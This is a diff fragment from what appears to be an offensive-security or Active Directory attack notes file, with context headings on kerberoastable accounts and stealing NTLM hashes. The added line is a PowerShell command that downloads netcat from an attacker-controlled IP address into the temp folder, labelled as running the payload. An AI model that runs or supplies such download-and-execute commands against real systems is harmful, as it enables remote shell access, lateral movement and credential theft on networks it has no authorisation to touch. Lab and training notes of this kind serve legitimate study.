@@ -8,7 +8,7 @@ Having domain credentials opens up a whole new world of enumeration possibilitie
 - Check for kerberoastable accounts
 
 
-
+IWR http://10.10.173.54:8000/nc.exe -OutFile %TEMP%\nc.exe | powershell -noprofile     [ Run the payload ]
 
 ## Steal NTLM hash 
 
